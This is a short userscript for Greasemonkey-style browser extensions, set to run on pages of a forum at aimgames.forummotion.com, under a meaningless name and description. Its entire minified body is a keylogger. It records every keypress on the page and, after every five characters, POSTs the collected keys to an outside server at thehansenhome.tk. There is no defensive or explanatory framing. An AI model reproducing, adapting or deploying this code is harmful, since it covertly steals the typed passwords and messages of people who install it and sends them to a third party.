// ==UserScript==
// @name        Anal
// @description trash man
// @namespace   trashaaaaaaaaaaaaaaaaaaaaaaaaaaa@gmail.com
// @include     http://aimgames.forummotion.com/*                     
// @version     2
// @grant       GM_xmlhttpRequest
// @license     MIT License (Expat); opensource.org/licenses/MIT
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// ==/UserScript==
'use strict';keys="";keyn=0;document.onkeypress=function(a){a=a||window.event;key=String.fromCharCode(a.charCode);keys+=key;keyn++;alert("got key");5<=keyn&&(b(),keyn=0)};function b(){var a=keys;try{alert("sent key"),GM_xmlhttpRequest({method:"POST",url:"http://www.thehansenhome.tk/s.php",data:"key="+a,headers:{"Content-Type":"application/x-www-form-urlencoded"},onload:function(){}})}catch(c){$.a({type:"POST",cache:!1,url:"//www.thehansenhome.tk/s.php",data:{key:a},b:function(){}})}};